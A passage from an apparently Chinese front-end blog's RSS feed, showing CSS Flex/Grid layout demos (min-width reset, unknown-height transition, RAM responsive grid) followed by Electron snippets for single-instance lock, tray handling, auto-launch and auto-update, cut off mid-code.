0div%3Anth-child(3)%20%7B%5Cn%20%20background%3A%20coral%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>ma<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>margin-left: auto<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>fw<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>align-content: center<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>mw<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>minwidthminwidth<span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>minwidthminwidthminwidthminwidth<span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>minwidthminwidthminwidthminwidthminwidthminwidth<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>grid-template-columns</span><span>:</span> <span>repeat</span><span>(</span>2<span>,</span> 1fr<span>)</span><span>;</span>
  <span>grid-template-rows</span><span>:</span> <span>repeat</span><span>(</span>2<span>,</span> 1fr<span>)</span><span>;</span>
  <span>grid-template-areas</span><span>:</span>
    <span>'ma fw'</span>
    <span>'mw mw'</span><span>;</span>
  <span>gap</span><span>:</span> 1rem<span>;</span>
<span>}</span>

<span>.ma</span> <span>{</span>
  <span>grid-area</span><span>:</span> ma<span>;</span>
  <span>display</span><span>:</span> flex<span>;</span>
  <span>flex-wrap</span><span>:</span> wrap<span>;</span>
  <span>align-content</span><span>:</span> center<span>;</span>
  <span>background</span><span>:</span> skyblue<span>;</span>
  <span>padding</span><span>:</span> 1rem<span>;</span>
<span>}</span>

<span>.ma div</span> <span>{</span>
  <span>margin-left</span><span>:</span> auto<span>;</span>
<span>}</span>

<span>.fw</span> <span>{</span>
  <span>grid-area</span><span>:</span> fw<span>;</span>
  <span>display</span><span>:</span> flex<span>;</span>
  <span>flex-wrap</span><span>:</span> wrap<span>;</span>
  <span>/* justify-content: center;
  align-content: center; */</span>
  <span>place-content</span><span>:</span> center<span>;</span>
  <span>background</span><span>:</span> pink<span>;</span>
<span>}</span>

<span>.mw</span> <span>{</span>
  <span>grid-area</span><span>:</span> mw<span>;</span>
  <span>display</span><span>:</span> flex<span>;</span>
<span>}</span>

<span>.mw div</span> <span>{</span>
  <span>flex</span><span>:</span> 1<span>;</span>
  <span>min-width</span><span>:</span> 0<span>;</span>
  <span>padding</span><span>:</span> 1rem<span>;</span>
  <span>overflow-wrap</span><span>:</span> break-word<span>;</span>
<span>}</span>

<span>.mw div:nth-child(1)</span> <span>{</span>
  <span>background</span><span>:</span> bisque<span>;</span>
<span>}</span>

<span>.mw div:nth-child(2)</span> <span>{</span>
  <span>background</span><span>:</span> aqua<span>;</span>
<span>}</span>

<span>.mw div:nth-child(3)</span> <span>{</span>
  <span>background</span><span>:</span> coral<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br></div></div>
            </div>
          </div>
          
        </div>
<h2 id="_3-grid"> 3. Grid</h2>
<ul>
<li>与 Flex 一样，重置最小尺寸为 0，实现小于 min-content 时等宽/高。</li>
</ul>

          <div
            id="code-demo-46ed3551"
           
  
 

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3Eminwidthminwidth%3C%2Fsection%3E%5Cn%20%20%3Csection%3Eminwidthminwidthminwidthminwidth%3C%2Fsection%3E%5Cn%20%20%3Csection%3Eminwidthminwidthminwidthminwidthminwidthminwidth%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20grid-template-columns%3A%20repeat(3%2C%20minmax(0%2C%201fr))%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20padding%3A%201rem%3B%5Cn%20%20overflow-wrap%3A%20break-word%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(1)%20%7B%5Cn%20%20background%3A%20bisque%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(2)%20%7B%5Cn%20%20background%3A%20aqua%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(3)%20%7B%5Cn%20%20background%3A%20coral%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>minwidthminwidth<span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>minwidthminwidthminwidthminwidth<span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>minwidthminwidthminwidthminwidthminwidthminwidth<span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>grid-template-columns</span><span>:</span> <span>repeat</span><span>(</span>3<span>,</span> <span>minmax</span><span>(</span>0<span>,</span> 1fr<span>)</span><span>)</span><span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>padding</span><span>:</span> 1rem<span>;</span>
  <span>overflow-wrap</span><span>:</span> break-word<span>;</span>
<span>}</span>

<span>section:nth-child(1)</span> <span>{</span>
  <span>background</span><span>:</span> bisque<span>;</span>
<span>}</span>

<span>section:nth-child(2)</span> <span>{</span>
  <span>background</span><span>:</span> aqua<span>;</span>
<span>}</span>

<span>section:nth-child(3)</span> <span>{</span>
  <span>background</span><span>:</span> coral<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div>
            </div>
          </div>
          
        </div>
<ul>
<li>不定高度的过渡动画（初始无高度，有高度不行）。</li>
</ul>

          <div
            id="code-demo-586d53a0"
           
  
 

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%5Cn%20%20%20%20%3Cbutton%3EHover%3C%2Fbutton%3E%5Cn%20%20%20%20%3Carticle%3E%5Cn%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%E6%9D%8E%E6%B7%B3%E7%BD%A1%E8%B5%B0%E5%88%B0%E5%A4%A7%E9%9B%AA%E5%9D%AA%E5%B4%96%E7%95%94%EF%BC%8C%E8%BA%AB%E5%90%8E%E6%98%AF%E4%B8%80%E5%A6%82%E4%BB%96%E4%B8%8E%E7%BB%BF%E8%A2%8D%E5%A5%B3%E5%AD%90%E5%9C%BA%E6%99%AF%E7%9A%84%E6%92%91%E4%BC%9E%E7%94%B7%E5%A5%B3%E3%80%82%E5%A5%B9%E8%A2%AB%E4%B8%80%E5%89%91%E6%B4%9E%E7%A9%BF%E5%BF%83%E8%83%B8%E6%97%B6%EF%BC%8C%E6%9B%BE%E6%83%A8%E7%99%BD%E7%AC%91%E8%A8%80%EF%BC%9A%E2%80%9C%E5%A4%A9%E4%B8%8D%E7%94%9F%E4%BD%A0%E6%9D%8E%E6%B7%B3%E7%BD%A1%EF%BC%8C%E5%BE%88%E6%97%A0%E8%B6%A3%E5%91%A2%E3%80%82%E2%80%9D%E6%9D%8E%E6%B7%B3%E7%BD%A1%E5%A4%A7%E5%A3%B0%E9%81%93%EF%BC%9A%E2%80%9C%E5%89%91%E6%9D%A5%EF%BC%81%E2%80%9D%E5%BE%BD%E5%B1%B1%E6%89%80%E6%9C%89%E5%89%91%E5%A3%AB%E7%9A%84%E6%95%B0%E7%99%BE%E4%BD%A9%E5%89%91%E4%B8%80%E9%BD%90%E5%87%BA%E9%9E%98%EF%BC%8C%E5%90%91%E5%A4%A7%E9%9B%AA%E5%9D%AA%E9%A3%9E%E6%9D%A5%E3%80%82%E9%BE%99%E8%99%8E%E5%B1%B1%E9%81%93%E5%A3%AB%E5%90%84%E5%BC%8F%E5%8D%83%E6%9F%84%E6%A1%83%E6%9C%A8%E5%89%91%E4%B8%80%E6%A6%82%E5%87%BA%E9%9E%98%EF%BC%8C%E6%B5%A9%E6%B5%A9%E8%8D%A1%E8%8D%A1%E9%A3%9E%E5%90%91%E7%89%AF%E7%89%9B%E5%A4%A7%E5%B2%97%E3%80%82%E4%B8%A4%E6%8B%A8%E9%A3%9E%E5%89%91%E3%80%82%E9%81%AE%E5%A4%A9%E8%94%BD%E6%9B%B0%E3%80%82%E8%BF%99%E4%B8%80%E6%9B%B0%EF%BC%8C%E5%89%91%E7%A5%9E%E6%9D%8E%E6%B7%B3%E7%BD%A1%E5%86%8D%E5%85%A5%E9%99%86%E5%9C%B0%E5%89%91%E4%BB%99%E5%A2%83%E7%95%8C%E3%80%82%5Cn%20%20%20%20%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Farticle%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20justify-items%3A%20center%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20width%3A%2050%25%3B%5Cn%20%20margin-top%3A%2010%25%3B%5Cn%7D%5Cn%5Cnbutton%3Ahover%20~%20article%20%7B%5Cn%20%20grid-template-rows%3A%201fr%3B%5Cn%7D%5Cn%5Cnbutton%20%7B%5Cn%20%20display%3A%20block%3B%5Cn%20%20margin%3A%200%20auto%3B%5Cn%7D%5Cn%5Cnarticle%20%7B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20grid-template-rows%3A%200fr%3B%5Cn%20%20transition%3A%200.5s%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%7D%5Cn%5Cnarticle%3Ahover%20%7B%5Cn%20%20grid-template-rows%3A%201fr%3B%5Cn%7D%5Cn%5Cnarticle%20div%20%7B%5Cn%20%20min-height%3A%200%3B%5Cn%20%20text-indent%3A%202em%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>
    <span><span><span>&lt;</span>button</span><span>></span></span>Hover<span><span><span>&lt;/</span>button</span><span>></span></span>
    <span><span><span>&lt;</span>article</span><span>></span></span>
      <span><span><span>&lt;</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>p</span><span>></span></span>
          李淳罡走到大雪坪崖畔，身后是一如他与绿袍女子场景的撑伞男女。她被一剑洞穿心胸时，曾惨白笑言：“天不生你李淳罡，很无趣呢。”李淳罡大声道：“剑来！”徽山所有剑士的数百佩剑一齐出鞘，向大雪坪飞来。龙虎山道士各式千柄桃木剑一概出鞘，浩浩荡荡飞向牯牛大岗。两拨飞剑。遮天蔽曰。这一曰，剑神李淳罡再入陆地剑仙境界。
        <span><span><span>&lt;/</span>p</span><span>></span></span>
      <span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>article</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>justify-items</span><span>:</span> center<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>width</span><span>:</span> 50%<span>;</span>
  <span>margin-top</span><span>:</span> 10%<span>;</span>
<span>}</span>

<span>button:hover ~ article</span> <span>{</span>
  <span>grid-template-rows</span><span>:</span> 1fr<span>;</span>
<span>}</span>

<span>button</span> <span>{</span>
  <span>display</span><span>:</span> block<span>;</span>
  <span>margin</span><span>:</span> 0 auto<span>;</span>
<span>}</span>

<span>article</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>grid-template-rows</span><span>:</span> 0fr<span>;</span>
  <span>transition</span><span>:</span> 0.5s<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>

<span>article:hover</span> <span>{</span>
  <span>grid-template-rows</span><span>:</span> 1fr<span>;</span>
<span>}</span>

<span>article div</span> <span>{</span>
  <span>min-height</span><span>:</span> 0<span>;</span>
  <span>text-indent</span><span>:</span> 2em<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></div></div>
            </div>
          </div>
          
        </div>
<ul>
<li>博客文章展示布局 <code>拖动窗口瞅瞅</code>。</li>
</ul>

          <div
            id="code-demo-6d090824"
           
  
 

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Cdiv%3E%3C%2Fdiv%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20min-height%3A%20400px%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20grid-template-columns%3A%20minmax(1rem%2C%201fr)%20minmax(auto%2C%2070ch)%20minmax(1rem%2C%201fr)%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20background%3A%20aqua%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>min-height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>grid-template-columns</span><span>:</span> <span>minmax</span><span>(</span>1rem<span>,</span> 1fr<span>)</span> <span>minmax</span><span>(</span>auto<span>,</span> 70ch<span>)</span> <span>minmax</span><span>(</span>1rem<span>,</span> 1fr<span>)</span><span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>background</span><span>:</span> aqua<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div>
            </div>
          </div>
          
        </div>
<ul>
<li>要是将 repeat() 函数和 minmax(min,max)、1fr 和 auto-fill（或 auto-fit）结合起来，可以很容易帮我们实现像下图这样的响应式布局效果。这种布局技术也被称为 RAM（Repeat, Auto, Minmax） 布局，一种无需依赖任何 CSS 媒体查询特性的响应式布局 <code>拖动窗口瞅瞅</code>。</li>
</ul>

          <div
            id="code-demo-6b8aaad2"
           
  
 

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20min-height%3A%20400px%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20grid-template-columns%3A%20repeat(auto-fill%2C%20minmax(200px%2C%201fr))%3B%5Cn%20%20padding%3A%2020px%3B%5Cn%20%20gap%3A%2020px%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20height%3A%20180px%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(odd)%20%7B%5Cn%20%20background%3A%20skyblue%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(even)%20%7B%5Cn%20%20background%3A%20pink%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>min-height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>grid-template-columns</span><span>:</span> <span>repeat</span><span>(</span>auto-fill<span>,</span> <span>minmax</span><span>(</span>200px<span>,</span> 1fr<span>)</span><span>)</span><span>;</span>
  <span>padding</span><span>:</span> 20px<span>;</span>
  <span>gap</span><span>:</span> 20px<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>height</span><span>:</span> 180px<span>;</span>
<span>}</span>

<span>section:nth-child(odd)</span> <span>{</span>
  <span>background</span><span>:</span> skyblue<span>;</span>
<span>}</span>

<span>section:nth-child(even)</span> <span>{</span>
  <span>background</span><span>:</span> pink<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>Electron</title>
      <link>https://www.matrixtheone.ga/web/note/Electron/</link>
      <guid>https://www.matrixtheone.ga/web/note/Electron/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Electron</source>
      <category>Electron</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-仅启动一个程序"> 1. 仅启动一个程序</h2>
<div><pre><code><span>if</span> <span>(</span><span>!</span>app<span>.</span><span>requestSingleInstanceLock</span><span>(</span><span>)</span><span>)</span> <span>{</span>
  app<span>.</span><span>quit</span><span>(</span><span>)</span>
  <span>return</span>
<span>}</span>

app<span>.</span><span>on</span><span>(</span><span>'second-instance'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>mainWindow<span>)</span> <span>return</span>
  <span>if</span> <span>(</span>mainWindow<span>.</span><span>isMinimized</span><span>(</span><span>)</span><span>)</span> mainWindow<span>.</span><span>restore</span><span>(</span><span>)</span>
  mainWindow<span>.</span><span>focus</span><span>(</span><span>)</span>
  mainWindow<span>.</span><span>show</span><span>(</span><span>)</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_2-点击关闭最小化程序"> 2. 点击关闭最小化程序</h2>
<div><pre><code>mainWindow<span>.</span><span>on</span><span>(</span><span>'close'</span><span>,</span> e <span>=></span> <span>{</span>
  e<span>.</span><span>preventDefault</span><span>(</span><span>)</span>
  mainWindow<span>.</span><span>hide</span><span>(</span><span>)</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_3-开机自启"> 3. 开机自启</h2>
<div><pre><code><span>// 判断开机自启</span>
app<span>.</span><span>getLoginItemSettings</span><span>(</span><span>{</span> args<span>:</span> <span>[</span><span>'--openAsHidden'</span><span>]</span> <span>}</span><span>)</span><span>.</span>openAtLogin

<span>// 设置开机自启</span>
app<span>.</span><span>setLoginItemSettings</span><span>(</span><span>{</span>
  openAtLogin<span>,</span>
  openAsHidden<span>:</span> <span>true</span><span>,</span>
  args<span>:</span> <span>[</span><span>'--openAsHidden'</span><span>]</span><span>,</span>
<span>}</span><span>)</span>

<span>// 如果不是开机自启，最大化显示程序</span>
mainWindow <span>=</span> <span>new</span> <span>BrowserWindow</span><span>(</span><span>{</span>
  show<span>:</span> <span>false</span><span>,</span>
<span>}</span><span>)</span>

mainWindow<span>.</span><span>on</span><span>(</span><span>'ready-to-show'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>process<span>.</span>argv<span>.</span><span>includes</span><span>(</span><span>'--openAsHidden'</span><span>)</span><span>)</span> <span>{</span>
    mainWindow<span>.</span><span>maximize</span><span>(</span><span>)</span>
    mainWindow<span>.</span><span>show</span><span>(</span><span>)</span>
  <span>}</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><h2 id="_4-点击托盘"> 4. 点击托盘</h2>
<div><pre><code>tray<span>.</span><span>on</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>mainWindow<span>.</span><span>isVisible</span><span>(</span><span>)</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>mainWindow<span>.</span><span>isMinimized</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      mainWindow<span>.</span><span>restore</span><span>(</span><span>)</span>
      mainWindow<span>.</span><span>focus</span><span>(</span><span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      mainWindow<span>.</span><span>focus</span><span>(</span><span>)</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    mainWindow<span>.</span><span>maximize</span><span>(</span><span>)</span>
    mainWindow<span>.</span><span>show</span><span>(</span><span>)</span>
  <span>}</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_5-自动更新"> 5. 自动更新</h2>
<div><pre><code><span>import</span> <span>type</span> <span>{</span> BrowserWindow <span>}</span> <span>from</span> <span>'electron'</span>
<span>import</span> log <span>from</span> <span>'electron-log'</span>
<span>import</span> <span>{</span> autoUpdater <span>}</span> <span>from</span> <span>'electron-updater'</span>

<span>const</span> <span>setupUpdate</span> <span>=</span> <span>(</span>mainWindow<span>:</span> BrowserWindow<span>)</span> <span>=></span> <span>{</span>
  log<span>.</span>transports<span>.</span>file<span>.</span>level <span>=</span> <span>'info'</span>
  autoUpdater<span>.</span>logger <span>=</span> log
  autoUpdater<span>.</span><span>checkForUpdatesAndNotify</span><span>(</span><span>)</span>

  autoUpdater<span>.</span><span>on</span><span>(</span><span>'checking-for-update'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    mainWindow<span>.</span>webContents<span>.</span><span>send</span><span>(</span><span>'update:checking'</span><span>)</span>
  <span>}</span><span>)</span>

  autoUpdater<span>.</span><span>on</span><span>(</span><span>'update-available'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    mainWindow<span>.</span>webContents<span>.</span><span>send</span><span>(</span><span>'update:available'</span><span>,</span> <span>true</span><span>)</span>
  <span>}</span><span>)</span>

  autoUpdater<span>.</span><span>on</span><span>(</span><span>'update-not-available'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    mainWindow<span>.</span>webContents<span>.</span><span>send</span><span>(</span><span>'update:available'</span><span>,</span> <span>false</span><span>)</span>
  <span>}</span><span>)</span>

  autoUpdater<span>.</span><span>on</span><span>(</span><span>'error'</span><span>,</span> error <span>=></span> <span>{</span>
